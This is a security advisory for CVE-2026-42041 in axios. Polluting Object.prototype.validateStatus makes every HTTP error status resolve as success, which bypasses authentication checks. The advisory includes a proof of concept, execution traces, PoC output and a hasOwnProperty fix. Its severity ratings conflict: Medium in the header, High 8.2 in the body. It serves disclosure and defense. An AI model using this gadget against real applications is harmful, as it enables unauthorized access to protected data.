# [M] Axios: Authentication Bypass via Prototype Pollution Gadget in `validateStatus` Merge Strategy

## Summary
Severity: Medium
Advisory: GHSA-w9j2-pvgh-6h63
CVE: CVE-2026-42041
CWE: CWE-1321, CWE-287
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-w9j2-pvgh-6h63
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.15.1
- npm: `axios` — affected >=0 <0.31.1

## Details
# Vulnerability Disclosure: Authentication Bypass via Prototype Pollution Gadget in `validateStatus` Merge Strategy

## Summary

The Axios library is vulnerable to a Prototype Pollution "Gadget" attack that allows any `Object.prototype` pollution to **silently suppress all HTTP error responses** (401, 403, 500, etc.), causing them to be treated as successful responses. This completely bypasses application-level authentication and error handling.

The root cause is that `validateStatus` is the **only** config property using the `mergeDirectKeys` merge strategy, which uses JavaScript's `in` operator — an operator that inherently traverses the prototype chain. When `Object.prototype.validateStatus` is polluted with `() => true`, all HTTP status codes are accepted as success.

**Severity:** High (CVSS 8.2)
**Affected Versions:** All versions (v0.x - v1.x including v1.15.0)
**Vulnerable Component:** `lib/core/mergeConfig.js` (`mergeDirectKeys` strategy) + `lib/core/settle.js`

## CWE

- **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')
- **CWE-287:** Improper Authentication

## CVSS 3.1

**Score: 8.2 (High)**

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N`

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network | PP is triggered remotely |
| Attack Complexity | Low | Once PP exists, a single property assignment exploits this. Consistent with GHSA-fvcv-3m26-pcqx |
| Privileges Required | None | No authentication needed |
| User Interaction | None | No user interaction required |
| Scope | Unchanged | Impact within the application |
| Confidentiality | Low | 401 treated as success may expose data behind auth gates |
| Integrity | High | All error handling and auth checks are silently bypassed — application operates on invalid assumptions |
| Availability | None | The function works correctly (returns true), no crash |

## Usage of "Helper" Vulnerabilities

This vulnerability requires **Zero Direct User Input**.

If an attacker can pollute `Object.prototype` via any other library in the stack, Axios will automatically inherit the polluted `validateStatus` function during config merge. The `in` operator in `mergeDirectKeys` makes this property **uniquely susceptible** to prototype pollution compared to all other config properties.

## Why `validateStatus` Is Uniquely Vulnerable

All other config properties use `defaultToConfig2`, which reads `config2[prop]` (traverses prototype). But `validateStatus` uses `mergeDirectKeys`, which uses the `in` operator:

```javascript
// mergeConfig.js:58-64 — mergeDirectKeys (ONLY used by validateStatus)
function mergeDirectKeys(a, b, prop) {
  if (prop in config2) {           // ← `in` traverses prototype chain!
    return getMergedValue(a, b);
  } else if (prop in config1) {
    return getMergedValue(undefined, a);
  }
}

// mergeConfig.js:94
const mergeMap = {
  // ... all others use defaultToConfig2 ...
  validateStatus: mergeDirectKeys,   // ← ONLY property using this strategy
};
```

The `in` operator is a **more aggressive** prototype traversal than property access. While `config2['validateStatus']` also traverses the prototype, the explicit `in` check makes the intent clearer and the vulnerability more direct.

## Proof of Concept

### 1. The Setup (Simulated Pollution)

```javascript
Object.prototype.validateStatus = () => true;
```

### 2. The Gadget Trigger (Safe Code)

```javascript
// Application checks authentication via HTTP status codes
try {
  const response = await axios.get('https://api.internal/admin/users');
  // Developer expects: 401 → catch block → redirect to login
  // Reality: 401 → treated as success → displays admin data
  processAdminData(response.data);  // Executes with 401 response body!
} catch (error) {
  redirectToLogin();  // NEVER REACHED for 401/403/500
}
```

### 3. The Execution

```javascript
// mergeConfig.js:58 — 'validateStatus' in config2
// config2 = { url: '/admin/users', method: 'get' }
// 'validateStatus' in config2 → checks prototype → finds () => true → TRUE
// → getMergedValue(defaultValidator, () => true) → returns () => true

// settle.js:16 — ALL status codes resolve
const validateStatus = response.config.validateStatus;  // () => true
if (!response.status || !validateStatus || validateStatus(response.status)) {
  resolve(response);  // 401, 403, 500 all resolve here!
}
```

### 4. The Impact

```
Before pollution:
  HTTP 200 → resolve (success)
  HTTP 401 → reject (auth error) → redirectToLogin()
  HTTP 403 → reject (forbidden) → showAccessDenied()
  HTTP 500 → reject (server error) → showErrorPage()

After pollution:
  HTTP 200 → resolve (success)
  HTTP 401 → resolve (SUCCESS!) → processAdminData() with error body
  HTTP 403 → resolve (SUCCESS!) → application thinks user has access
  HTTP 500 → resolve (SUCCESS!) → application processes error as data
```

## Verified PoC Output

```
--- Before Pollution ---
401: REJECTED as expected - Request failed with status code 401
500: REJECTED as expected - Request failed with status code 500

--- After Pollution ---
200: RESOLVED as success (status: 200)
301: RESOLVED as success (status: 301)
401: RESOLVED as success (status: 401)
403: RESOLVED as success (status: 403)
404: RESOLVED as success (status: 404)
500: RESOLVED as success (status: 500)
503: RESOLVED as success (status: 503)

--- Authentication Bypass Demo ---
Auth check bypassed! 401 treated as success.
Application proceeds with: { status: 401, message: 'Response with status 401' }
```

## Impact Analysis

- **Authentication Bypass:** Applications relying on axios rejecting 401/403 to enforce auth will silently accept unauthorized responses, allowing unauthenticated access to protected resources.
- **Silent Error Swallowing:** 500-series errors are treated as success, causing applications to process error bodies as valid data — leading to data corruption or logic errors.
- **Security Control Bypass:** Rate limiting (429), WAF blocks (403), and CAPTCHA challenges are suppressed.
- **Universal Scope:** Affects every axios instance in the application, including third-party libraries.

## Recommended Fix

Replace the `in` operator with `hasOwnProperty` in `mergeDirectKeys`:

```javascript
// FIXED: lib/core/mergeConfig.js
function mergeDirectKeys(a, b, prop) {
  if (Object.prototype.hasOwnProperty.call(config2, prop)) {
    return getMergedValue(a, b);
  } else if (Object.prototype.hasOwnProperty.call(config1, prop)) {
    return getMergedValue(undefined, a);
  }
}
```

## Resources

- [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios](https://github.com/advisories/GHSA-fvcv-3m26-pcqx)
- [MDN: `in` operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/in)
- [Axios GitHub Repository](https://github.com/axios/axios)

## Timeline

| Date | Event |
|---|---|
| 2026-04-15 | Vulnerability discovered during source code audit |
| 2026-04-15 | PoC developed and vulnerability confirmed |
| 2026-04-16 | Report revised for accuracy |
| TBD | Report submitted to vendor via GitHub Security Advisory |

## References
- https://github.com/axios/axios/security/advisories/GHSA-w9j2-pvgh-6h63
- https://nvd.nist.gov/vuln/detail/CVE-2026-42041
- https://github.com/axios/axios
